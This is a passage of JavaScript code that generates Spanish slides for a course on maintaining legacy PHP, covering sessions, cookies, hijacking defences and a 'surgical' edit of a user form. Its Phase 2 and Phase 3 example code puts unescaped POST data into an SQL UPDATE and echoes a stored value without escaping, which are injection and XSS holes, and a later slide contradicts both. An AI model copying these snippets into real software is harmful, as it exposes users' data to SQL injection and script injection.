    slide.addText(q.text, { x: 1.6, y, w: 8.72, h: 1.56, fontFace: TYPOGRAPHY.body, fontSize: 15.6, color: C.navy, margin: 0, valign: "mid" });
    if (i < 2) slide.addShape(SH.line, { x: 0.88, y: y + 1.72, w: 10.28, h: 0, line: { color: C.border, pt: 1 } });
  });
  validateSlide(slide, pptx);
}

function createBlock2SynthesisSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Síntesis del Bloque 2", "El Mapa del Idioma", "Bloque 2");
  addCenterStatement(slide, SH, "Entender PHP legacy no es aprender un lenguaje nuevo, es aprender a leer cómo fluye HTTP.", {
    x: 0.88, y: 2.22, w: 10.26, h: 1.14, fill: C.navy, color: C.white, fontSize: 18, rectRadius: 0.07
  });
  const points = [
    { title: "Sintaxis $", body: "Variables sin tipo obligatorio y arreglos asociativos.", accent: C.navy },
    { title: "Inyección", body: "PHP vive dentro del HTML inyectando datos con echo.", accent: C.red },
    { title: "Superglobales", body: "La verdad llega vía $_GET y $_POST.", accent: C.gold },
  ];
  points.forEach((p, i) => {
    addMiniCard(slide, SH, {
      x: 0.88 + i * 3.44, y: 3.62, w: 3.2, h: 2.06, title: p.title, body: p.body, accent: p.accent,
      fill: C.white, line: C.border, titleFontSize: 13, bodyFontSize: 10.5
    });
  });
  addMiniCard(slide, SH, {
    x: 0.88, y: 5.92, w: 10.26, h: 0.62, title: "Próximo Bloque → Sesiones y Cookies",
    body: "Ya recibimos datos. Ahora aprendamos cómo el servidor 'recuerda' al usuario.",
    fill: C.softNeutral, line: C.softNeutral, accent: C.gold, titleFontSize: 11, bodyFontSize: 10.4
  });
  validateSlide(slide, pptx);
}

// ─── BLOQUE 3: SESIONES, COOKIES Y EL ESTADO DEL USUARIO ─────────────────────

function createBlock3IntroSlide() {
  const slide = pptx.addSlide();
  slide.background = { color: C.navy };
  addMarkBox(slide, SH, logoMarkPath, { x: 9.62, y: 0.28, w: 0.68, h: 0.68 });
  addChip(slide, SH, "BLOQUE 3", { x: 0.88, y: 0.68, w: 1.32, h: 0.34, fill: C.red, color: C.white, fontSize: 10.6 });
  addBarsMotif(slide, 0.88, 1.22, 1.1, C.red);
  slide.addText("Sesiones, Cookies y el\nEstado del Usuario", {
    x: 0.88, y: 2.14, w: 9.2, h: 1.26, fontFace: TYPOGRAPHY.display, fontSize: 36, bold: true, color: C.white, valign: "mid",
  });
  slide.addText("Cómo el servidor construye una memoria persistente en un mundo sin estado.", {
    x: 0.88, y: 3.62, w: 8.2, h: 0.38, fontFace: TYPOGRAPHY.body, fontSize: 15.2, color: "DCE6F2",
  });
  validateSlide(slide, pptx);
}

function createHttpStatelessSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "El Problema: HTTP Stateless", "Bloque 3 · 3.1 La amnesia del servidor", "Bloque 3");
  addCenterStatement(slide, SH, "Por defecto, HTTP no tiene memoria. Cada petición es un 'extraño' para el servidor.", {
    x: 0.88, y: 2.22, w: 10.26, h: 0.82, fill: C.softNeutral, color: C.navy, fontSize: 18
  });
  
  const flow = [
    { t: "Petición 1", b: "User: 'Hola, soy Diego'.\nServer: 'Ok, toma tu perfil'." },
    { t: "Petición 2", b: "User: 'Dime mi saldo'.\nServer: '¿Quién eres tú?'." },
  ];
  flow.forEach((f, i) => {
    addMiniCard(slide, SH, { x: 0.88 + i * 5.24, y: 3.42, w: 5.02, h: 2.5, title: f.t, body: f.b, accent: C.red, fill: C.white, line: C.border });
  });
  validateSlide(slide, pptx);
}

function createSessionStartSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "La Solución: El Casillero del Servidor", "Bloque 3 · 3.1 session_start()", "Bloque 3");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Mecánica de session_start()", columns: 2,
    entries: [
      { badge: "INIT", title: "Iniciación", body: "Crea un archivo físico en el servidor (usualmente en /tmp) para este usuario.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "ID", title: "Identificador", body: "Genera un ID único y aleatorio de 32 caracteres (PHPSESSID).", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "COOKIE", title: "Envío", body: "PHP inyecta automáticamente el ID en los headers de respuesta HTTP.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
      { badge: "RULE", title: "Orden de Oro", body: "Debe ejecutarse antes de enviar CUALQUIER texto al navegador.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
    ]
  });
  validateSlide(slide, pptx);
}

function createSessionCookieSimbiosisSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Simbiosis: Sesión ↔ Cookie", "Bloque 3 · 3.2 El ticket de entrada", "Puente");
  
  const y = 2.8;
  addCard(slide, SH, { x: 0.88, y, w: 4.5, h: 2.5, title: "Servidor (Sesión)", body: "Contiene los datos reales:\n- nombre: 'Diego'\n- rol: 'admin'\n- id: 102", accent: C.navy, fill: C.white });
  slide.addText("🔗 PHPSESSID", { x: 5.38, y: y + 0.8, w: 1.0, h: 1.0, fontSize: 14, bold: true, color: C.red, align: "center" });
  addCard(slide, SH, { x: 6.38, y, w: 4.76, h: 2.5, title: "Navegador (Cookie)", body: "Contiene solo el ID:\n- Value: 'abc123xyz...'\n- Domain: 'mi-app.com'", accent: C.red, fill: C.white });

  addCenterStatement(slide, SH, "La Cookie es el ticket; la Sesión es el casillero que abre ese ticket.", {
    x: 0.88, y: 5.6, w: 10.26, h: 0.8, fill: C.gold, fontSize: 18, color: C.navy, bold: true
  });
  validateSlide(slide, pptx);
}

function createCookieAnatomySlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Anatomía de una Cookie", "Bloque 3 · 3.2 El Protocolo Crudo", "Anatomía");
  
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.18, w: 10.26, h: 1.4, title: "Header HTTP: Set-Cookie",
    code: `Set-Cookie: PHPSESSID=abc123xyz789; Expires=Wed, 21 Oct 2026 07:28:00 GMT;\nPath=/; HttpOnly; Secure; SameSite=Lax`,
    lang: "text", fontSize: 11
  });

  addChecklistGrid(slide, SH, {
    x: 0.88, y: 3.82, w: 10.26, h: 2.8, title: "Desglose Técnico de Atributos", columns: 2,
    entries: [
      { badge: "ID", title: "Name/Value", body: "El par clave-valor que identifica la sesión (PHPSESSID).", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "TIME", title: "Expires", body: "Fecha exacta en que el navegador borrará la cookie automáticamente.", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "SAFE", title: "HttpOnly", body: "Regla de Oro: impide que JavaScript lea la cookie, mitigando ataques XSS.", accent: C.red, fill: C.white, badgeFill: C.red },
      { badge: "SAFE", title: "Secure", body: "Obliga a que la cookie solo viaje si la conexión es HTTPS (cifrada).", accent: C.red, fill: C.white, badgeFill: C.red },
    ]
  });
  validateSlide(slide, pptx);
}

function createSessionSyntaxSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Sintaxis: Gestionando el Estado", "Bloque 3 · 3.3 El arreglo $_SESSION", "Bloque 3");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Lectura y Escritura de Sesión",
    code: `<?php
session_start(); // Siempre al inicio

// ESCRITURA (Después de un Login exitoso)
$_SESSION['user_id'] = 502;
$_SESSION['is_logged'] = true;

// LECTURA (En cualquier otra página del sitio)
$id = $_SESSION['user_id'];
echo "Hola de nuevo, usuario " . $id;

// VERIFICACIÓN
if (isset($_SESSION['is_logged'])) {
    // Mostrar contenido privado
}`,
    lang: "php", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createAuthFlowSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Flujo de Autenticación (Login)", "Bloque 3 · 3.3 El ciclo completo", "Puente");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "De la petición a la persistencia", columns: 2,
    entries: [
      { badge: "1. REQ", title: "Petición POST", body: "El usuario envía user/pass desde un formulario HTML.", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "2. VAL", title: "Validación", body: "El servidor consulta la DB y confirma que el usuario es real.", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "3. WRIT", title: "Escritura en Sesión", body: "Si es válido, guardamos sus datos en el arreglo $_SESSION.", accent: C.red, fill: C.white, badgeFill: C.red },
      { badge: "4. REDI", title: "Redirección", body: "Enviamos al usuario al dashboard usando header('Location: ...').", accent: C.red, fill: C.white, badgeFill: C.red },
    ]
  });
  validateSlide(slide, pptx);
}

function createRouteProtectionSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Protección de Rutas (Middleware Legacy)", "Bloque 3 · 3.3 Control de Acceso", "Bloque 3");
  addCard(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 1.4, title: "La importancia de la validación",
    body: "En el legado, no hay sistema de roles automático. Debemos preguntar manualmente en cada página si el usuario tiene permiso.",
    accent: C.red, fill: C.white, line: C.border
  });
  addCodePanel(slide, SH, {
    x: 0.88, y: 3.82, w: 10.26, h: 2.94, title: "auth_check.php (Fragmento)",
    code: `<?php
session_start();

if (!isset($_SESSION['user_id'])) {
    // Si no está logueado, lo expulsamos
    header("Location: login.php?error=no_session");
    exit(); // Detenemos la ejecución del resto de la página
} ?>`,
    lang: "php", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createSessionIdActionSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "El ID de Sesión en Acción", "Bloque 3 · 3.2 Viaje en los Headers", "Protocolo");
  
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Persistencia vía Headers HTTP", columns: 2,
    entries: [
      { badge: "STEP 1", title: "Respuesta (Login)", body: "El servidor envía el Header 'Set-Cookie: PHPSESSID=abc123...'.", accent: C.red, fill: C.white, badgeFill: C.red },
      { badge: "STEP 2", title: "Almacenamiento", body: "El navegador guarda el ID en su jarra de cookies local asociada al dominio.", accent: C.red, fill: C.white, badgeFill: C.red },
      { badge: "STEP 3", title: "Petición (Perfil)", body: "En cada nuevo clic, el navegador incluye el Header 'Cookie: PHPSESSID=abc123...'.", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "STEP 4", title: "Reconocimiento", body: "PHP lee el ID, busca el archivo en /tmp y rellena el arreglo $_SESSION.", accent: C.navy, fill: C.white, badgeFill: C.navy },
    ]
  });
  validateSlide(slide, pptx);
}

function createSessionSecurity1Slide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Seguridad I: Secuestro de Sesión", "Bloque 3 · 3.3 Session Hijacking", "Seguridad");
  addMythRealityGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "¿Por qué proteger la Cookie?",
    entries: [
      { badge: "MITO", myth: "El usuario no puede ver su PHPSESSID.", reality: "Está visible en el inspector (Application -> Cookies).", accent: C.red, badgeFill: C.paleRed },
      { badge: "MITO", myth: "El ID es imposible de adivinar.", reality: "Se puede robar vía XSS si no usas HttpOnly.", accent: C.red, badgeFill: C.paleRed },
      { badge: "FACT", myth: "Robo de identidad técnica.", reality: "Si un atacante tiene tu PHPSESSID, es el dueño de tu sesión.", accent: C.navy, badgeFill: C.softBlue },
      { badge: "FACT", myth: "Uso de HTTPS.", reality: "Cifra el viaje del ID para que no sea capturado en la red.", accent: C.navy, badgeFill: C.softBlue },
    ]
  });
  validateSlide(slide, pptx);
}

function createSessionSecurity2Slide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Seguridad II: Regeneración de ID", "Bloque 3 · 3.3 session_regenerate_id()", "Bloque 3");
  addCard(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 1.8, title: "Cambiando la llave al entrar",
    body: "Una práctica de ingeniería vital es cambiar el ID de sesión apenas el usuario se loguea. Esto invalida cualquier ID que un atacante haya intentado pre-establecer.",
    accent: C.gold, fill: C.white, line: C.border
  });
  addCodePanel(slide, SH, {
    x: 0.88, y: 4.2, w: 10.26, h: 2.56, title: "Implementación Segura",
    code: `<?php
if (validar_credenciales($u, $p)) {
    session_start();
    session_regenerate_id(true); // Genera una nueva llave y borra la vieja
    $_SESSION['user_id'] = $user['id'];
}`,
    lang: "php", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createSessionDestroySlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Destrucción del Estado (Logout)", "Bloque 3 · 3.3 Quemando el casillero", "Bloque 3");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Limpieza Total", columns: 2,
    entries: [
      { badge: "UNSET", title: "unset($_SESSION['x'])", body: "Borra una sola llave. El usuario sigue logueado pero sin ese dato.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "CLEAN", title: "$_SESSION = []", body: "Limpia todas las variables pero mantiene el archivo de sesión.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "BURN", title: "session_destroy()", body: "Elimina el archivo físico del servidor. El usuario es olvidado.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
      { badge: "EXPI", title: "Expiración por inactividad", body: "El servidor borra sesiones viejas automáticamente tras X minutos.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
    ]
  });
  validateSlide(slide, pptx);
}

function createIaSessionAuditorSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "IA como Auditora de Sesiones", "Bloque 3 · Huella Metodológica", "IA");
  addPromptQualityCompare(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.46,
    title: "Auditoría de Seguridad en Legado",
    badTitle: "Prompt de Creación",
    badSubtitle: "Sin foco en seguridad",
    badPrompt: "'Crea un script de login en PHP con sesiones'.",
    badNotes: ["Usa session_start básico.", "No regenera IDs.", "Olvida validaciones de HttpOnly."],
    goodTitle: "Prompt de Auditoría",
    goodSubtitle: "Análisis Crítico",
    goodPrompt: "'Analiza este script de login legacy: identifica vulnerabilidades en el manejo de PHPSESSID y sugiere parches quirúrgicos'.",
    goodNotes: ["Detecta riesgos de Hijacking.", "Propone mejoras de integridad.", "Mantiene la arquitectura original."],
    footer: "El agente es tu consultor de seguridad, no solo un generador de código."
  });
  validateSlide(slide, pptx);
}

function createBlock3QuestionsSlide() {
  const slide = pptx.addSlide();
  slide.background = { color: C.warm };
  addMarkBox(slide, SH, logoMarkPath, { x: 9.62, y: 0.28, w: 0.68, h: 0.68 });
  addChip(slide, SH, "PREGUNTAS GUÍA — BLOQUE 3", { x: 0.88, y: 0.44, w: 3.4, h: 0.3, fill: C.navy, color: C.white, fontSize: 10.0 });
  const questions = [
    { n: "01", text: "¿Qué pasaría si ejecutamos código HTML antes del comando session_start()?" },
    { n: "02", text: "¿Por qué el ID de sesión viaja en una Cookie y no en la URL por seguridad?" },
    { n: "03", text: "¿Cuál es la diferencia técnica entre usar unset() y session_destroy()?" },
  ];
  questions.forEach((q, i) => {
    const y = 1.12 + i * 1.96;
    slide.addText(q.n, { x: 0.88, y: y + 0.04, w: 0.58, h: 0.68, fontFace: TYPOGRAPHY.display, fontSize: 38, bold: true, color: C.border, margin: 0, valign: "mid" });
    slide.addText(q.text, { x: 1.6, y, w: 8.72, h: 1.56, fontFace: TYPOGRAPHY.body, fontSize: 15.6, color: C.navy, margin: 0, valign: "mid" });
    if (i < 2) slide.addShape(SH.line, { x: 0.88, y: y + 1.72, w: 10.28, h: 0, line: { color: C.border, pt: 1 } });
  });
  validateSlide(slide, pptx);
}

function createBlock3SynthesisSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Síntesis del Bloque 3", "La Memoria del Backend", "Bloque 3");
  addCenterStatement(slide, SH, "Las sesiones son el pegamento técnico que convierte páginas aisladas en una Aplicación Web real.", {
    x: 0.88, y: 2.22, w: 10.26, h: 1.14, fill: C.navy, color: C.white, fontSize: 18, rectRadius: 0.07
  });
  const points = [
    { title: "session_start", body: "Apertura del casillero privado en el servidor.", accent: C.navy },
    { title: "PHPSESSID", body: "El ticket físico que el navegador presenta en cada clic.", accent: C.red },
    { title: "Integridad", body: "La obligación de destruir y regenerar IDs por seguridad.", accent: C.gold },
  ];
  points.forEach((p, i) => {
    addMiniCard(slide, SH, {
      x: 0.88 + i * 3.44, y: 3.62, w: 3.2, h: 2.06, title: p.title, body: p.body, accent: p.accent,
      fill: C.white, line: C.border, titleFontSize: 13, bodyFontSize: 10.5
    });
  });
  addMiniCard(slide, SH, {
    x: 0.88, y: 5.92, w: 10.26, h: 0.62, title: "Próximo Bloque → Mantenimiento Quirúrgico",
    body: "Ya sabemos cómo funciona PHP. Ahora vamos a operar un sistema real sin matarlo.",
    fill: C.softNeutral, line: C.softNeutral, accent: C.gold, titleFontSize: 11, bodyFontSize: 10.4
  });
  validateSlide(slide, pptx);
}

// ─── BLOQUE 4: MANTENIMIENTO QUIRÚRGICO DE UN CRUD ───────────────────────────

function createBlock4IntroSlide() {
  const slide = pptx.addSlide();
  slide.background = { color: C.navy };
  addMarkBox(slide, SH, logoMarkPath, { x: 9.62, y: 0.28, w: 0.68, h: 0.68 });
  addChip(slide, SH, "BLOQUE 4", { x: 0.88, y: 0.68, w: 1.32, h: 0.34, fill: C.red, color: C.white, fontSize: 10.6 });
  addBarsMotif(slide, 0.88, 1.22, 1.1, C.red);
  slide.addText("El Arte del Mantenimiento\nQuirúrgico", {
    x: 0.88, y: 2.14, w: 9.2, h: 1.26, fontFace: TYPOGRAPHY.display, fontSize: 36, bold: true, color: C.white, valign: "mid",
  });
  slide.addText("Aplicando el Axioma de Integridad en escenarios reales de producción.", {
    x: 0.88, y: 3.62, w: 8.2, h: 0.38, fontFace: TYPOGRAPHY.body, fontSize: 15.2, color: "DCE6F2",
  });
  validateSlide(slide, pptx);
}

function createAllInOneAnatomySlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Anatomía del 'Todo-en-Uno'", "Bloque 4 · 4.1 Descomposición del archivo", "Anatomía");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Estructura típica de un archivo legacy (editar_user.php)", columns: 2,
    entries: [
      { badge: "L1-15", title: "Cabecera", body: "session_start() y Conexión a Base de Datos (mysqli).", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "L16-45", title: "Lógica POST", body: "if($_POST) -> Captura datos y ejecuta el UPDATE SQL.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
      { badge: "L46-55", title: "Consulta", body: "SELECT inicial para cargar los datos actuales en el form.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "L56+", title: "Vista", body: "Mezcla de HTML con PHP para mostrar los valores (echo).", accent: C.gold, fill: C.white, badgeFill: C.gold }
    ]
  });
  validateSlide(slide, pptx);
}

function createStabilitySlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Estabilidad > Elegancia", "Bloque 4 · 4.2 La prioridad del Ingeniero", "Axioma");
  addDelegationSplit(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "¿Por qué no reescribir?",
    left: { title: "El Riesgo", subtitle: "Reescritura Total", items: ["Introduce bugs en lógica vieja.", "Incompatible con el resto del sitio.", "Cuesta tiempo que el cliente no paga."], accent: C.red, fill: C.paleRed },
    right: { title: "El Valor", subtitle: "Cirugía Quirúrgica", items: ["El sistema sigue operando.", "Cambio preciso y testeable.", "Mantiene la coherencia del autor."], accent: C.navy, fill: C.softBlue },
    bridgeLabel: "Axioma", bridgeBody: "no\ndestruir",
  });
  validateSlide(slide, pptx);
}

function createSurgicalScenarioSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Escenario de Mantenimiento", "Bloque 4 · Caso de Uso Real", "Misión");
  addCard(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 2.0, title: "El Requerimiento del Cliente",
    body: "Nuestra aplicación de gestión de empleados tiene 8 años. El cliente necesita agregar el campo 'Teléfono de Emergencia' al formulario de edición de perfil hoy mismo. No hay presupuesto ni tiempo para migrar a FastAPI.",
    accent: C.red, fill: C.white, line: C.border
  });
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 4.42, w: 10.26, h: 2.34, title: "Plan de Operación", columns: 3,
    entries: [
      { badge: "1", title: "Mapear", body: "Localizar variables.", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "2", title: "Inyectar", body: "SQL y HTML nuevo.", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "3", title: "Validar", body: "Smoke test.", accent: C.navy, fill: C.white, badgeFill: C.navy },
    ]
  });
  validateSlide(slide, pptx);
}

function createPhase1InputSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Fase 1: Mapeo de la Entrada", "Bloque 4 · 4.3 Capturando el nuevo dato", "Cirugía");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Localización del bloque $_POST",
    code: `// Buscamos dónde el autor original captura los datos
if (isset($_POST['guardar'])) {
    $nombre = $_POST['nombre'];
    $email  = $_POST['email'];
    
    // NUESTRA CIRUGÍA:
    $telefono = $_POST['telefono_emergencia'] ?? '';
    
    // ... sigue la lógica SQL`,
    lang: "php", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createPhase2PersistenceSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Fase 2: Mapeo de la Persistencia", "Bloque 4 · 4.3 Inyectando en el SQL", "Cirugía");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Modificación de la Query UPDATE",
    code: `// ORIGINAL:
// $sql = "UPDATE users SET nombre='$nombre', email='$email' WHERE id=$id";

// QUIRÚRGICO (Respetando el estilo de comillas del autor):
$sql = "UPDATE users SET 
        nombre='$nombre', 
        email='$email', 
        emergency_phone='$telefono' 
        WHERE id=$id";

mysqli_query($conn, $sql);`,
    lang: "php", fontSize: 15
  });
  validateSlide(slide, pptx);
}

function createPhase3ViewSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Fase 3: Mapeo de la Vista", "Bloque 4 · 4.3 Inyectando en el HTML", "Cirugía");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Formulario HTML Mezclado",
    code: `<!-- Añadimos el nuevo input inyectando el valor inicial -->
<label>Teléfono de Emergencia:</label>
<input type="text" 
       name="telefono_emergencia" 
       value="<?php echo $user_data['emergency_phone']; ?>">

<!-- El atributo 'name' debe coincidir con nuestra Fase 1 -->`,
    lang: "html", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createMonsterFileMappingSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Arqueología: El Archivo Monstruo", "Bloque 4 · 4.4 Mapeo de Grandes Volúmenes", "Arqueología");
  addCard(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 1.4, title: "El desafío de las 1000+ líneas",
    body: "En producción, no operamos archivos de 20 líneas. Encontraremos scripts gigantes con lógica de hace 10 años. No podemos leerlo todo; debemos mapear.",
    accent: C.navy, fill: C.white, line: C.border
  });
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 3.82, w: 10.26, h: 2.94, title: "Táctica de Mapeo con IA", columns: 2,
    entries: [
      { badge: "STEP 1", title: "Carga de Contexto", body: "Entregar el archivo completo al agente para análisis de flujo.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "STEP 2", title: "Extracción de Nombres", body: "Listar variables de sesión y POST que el archivo utiliza.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "STEP 3", title: "Grafo de Dependencias", body: "Identificar qué otros archivos incluye (include/require).", accent: C.red, fill: C.paleRed, badgeFill: C.red },
      { badge: "STEP 4", title: "Puntos de Retorno", body: "Localizar todos los 'header(Location...)' y 'exit;'.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
    ]
  });
  validateSlide(slide, pptx);
}

function createProfessionalLogsSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Diagnóstico: El Arte de Leer Logs", "Bloque 4 · 4.4 Visibilidad en el Caos", "Diagnóstico");
  addCodePanel(slide, SH, {
    x: 0.88, y: 2.22, w: 6.8, h: 4.54, title: "Habilitando el Microscopio",
    code: `<?php
// En desarrollo, queremos ver el error de inmediato
ini_set('display_errors', 1);
error_reporting(E_ALL);

// En producción, NUNCA mostramos errores al usuario. 
// Los mandamos a un archivo secreto:
error_log("Falla al actualizar user ID: $id", 3, "/var/log/app_errors.log");
?>`,
    lang: "php", fontSize: 16
  });
  addMiniCard(slide, SH, {
    x: 7.94, y: 2.22, w: 3.2, h: 4.54, title: "Mentalidad Senior",
    body: "Un amateur intenta corregir probando a ciegas en el navegador. Un profesional abre la terminal y revisa el log de errores para ver el mensaje exacto del servidor.",
    accent: C.red, fill: C.paleRed, titleFontSize: 14, bodyFontSize: 11
  });
  validateSlide(slide, pptx);
}

function createLegacySanitizationSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Sanitización Dual: El Escudo", "Bloque 4 · 4.5 Seguridad en la Jungla", "Seguridad");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Dos tipos de ataques, dos soluciones", columns: 2,
    entries: [
      { badge: "SQLi", title: "mysqli_real_escape_string()", body: "Limpia comillas y caracteres raros antes de que lleguen a la Base de Datos.", accent: C.red, fill: C.white, badgeFill: C.red },
      { badge: "XSS", title: "htmlspecialchars()", body: "Convierte etiquetas <script> en texto inofensivo para que no se ejecuten al mostrar.", accent: C.red, fill: C.white, badgeFill: C.red },
      { badge: "RULE", title: "Filtro de Entrada", body: "Todo lo que viene de $_POST es radiactivo hasta que lo limpies.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
      { badge: "RULE", title: "Filtro de Salida", body: "Todo lo que imprimes con 'echo' debe ser sanitizado para la vista.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
    ]
  });
  validateSlide(slide, pptx);
}

function createSeamPatternSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "El Patrón 'Costura' (Seam)", "Bloque 4 · 4.5 Intervención de Mínimo Impacto", "Patrones");
  addCenterStatement(slide, SH, "Una 'Costura' es un lugar donde puedes alterar el comportamiento sin editar el código fuente original (o editándolo mínimamente).", {
    x: 0.88, y: 2.22, w: 10.26, h: 1.14, fill: C.navy, color: C.white, fontSize: 18, rectRadius: 0.07
  });
  addCodePanel(slide, SH, {
    x: 0.88, y: 3.6, w: 10.26, h: 3.16, title: "Identificando la costura en editar_user.php",
    code: `// COSTURA: El punto exacto antes del mysqli_query
$telefono = clean($_POST['tel']); 

/* --- Nuestra Intervención Quirúrgica --- */
log_change($id, 'edit_phone'); // Nuevo sistema
/* --------------------------------------- */

mysqli_query($conn, "UPDATE users SET phone='$telefono' WHERE id=$id");`,
    lang: "php", fontSize: 16
  });
  validateSlide(slide, pptx);
}

function createCharacterizationTestSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Test de Caracterización con IA", "Bloque 4 · 4.6 IA como Red de Seguridad", "Metodología");
  addPromptQualityCompare(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.46,
    title: "IA como Test Unitario Humano",
    badTitle: "Pregunta Genérica",
    badSubtitle: "Poco útil",
    badPrompt: "'¿Este código PHP funciona bien?'.",
    badNotes: ["IA dirá que sí o dará consejos genéricos.", "No ayuda a prevenir regresiones.", "No entiende el flujo."],
    goodTitle: "Pregunta de Caracterización",
    goodSubtitle: "Analizando Casos de Borde",
    goodPrompt: "'Analiza este PHP: ¿Qué pasa exactamente si $_SESSION['user_id'] está vacío y el usuario envía el POST? Describe el flujo paso a paso'.",
    goodNotes: ["Revela huecos de seguridad.", "Documenta el comportamiento real.", "Actúa como un test antes de cambiar."],
    footer: "Caracterizar es entender cómo se comporta el sistema HOY, antes de intentar mejorarlo."
  });
  validateSlide(slide, pptx);
}

function createLegacyDatesSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "Fechas y Tiempos en el Barro", "Bloque 4 · 4.6 El dolor de cabeza clásico", "Datos");
  addChecklistGrid(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Manejo de Tiempos Legacy", columns: 2,
    entries: [
      { badge: "DATE", title: "date('Y-m-d')", body: "La forma clásica de formatear. Cuidado con el timezone del servidor.", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "STR", title: "strtotime()", body: "Convierte casi cualquier texto en un timestamp. Es poderosa pero impredecible.", accent: C.navy, fill: C.white, badgeFill: C.navy },
      { badge: "DB", title: "Formatos Inconsistentes", body: "En el legado verás fechas como strings, como enteros o como datetime.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
      { badge: "IA", title: "IA al rescate", body: "Usa agentes para convertir formatos complejos entre el front y la DB legacy.", accent: C.gold, fill: C.white, badgeFill: C.gold },
    ]
  });
  validateSlide(slide, pptx);
}

function createLegacyEncodingSlide() {
  const slide = pptx.addSlide();
  addHeader(slide, "El Error de la 'Ñ': Encodings", "Bloque 4 · 4.6 UTF-8 vs. Latin1", "Datos");
  addDelegationSplit(slide, SH, {
    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Guerra de Caracteres",
    left: { title: "App Moderna", subtitle: "UTF-8", items: ["Soporta emojis.", "Soporta todos los idiomas.", "Estándar global."], accent: C.navy, fill: C.softBlue },
    right: { title: "Sistemas Legacy", subtitle: "ISO-8859-1", items: ["Solo soporta latinos básicos.", "Rompe las tildes y las 'ñ'.", "Causa el 'mojibake' (Ã±)."], accent: C.red, fill: C.paleRed },
    bridgeLabel: "vs", bridgeBody: "codificación",
  });
  validateSlide(slide, pptx);
}

function createDocumentationArcheologySlide() {
  const slide = pptx.addSlide();
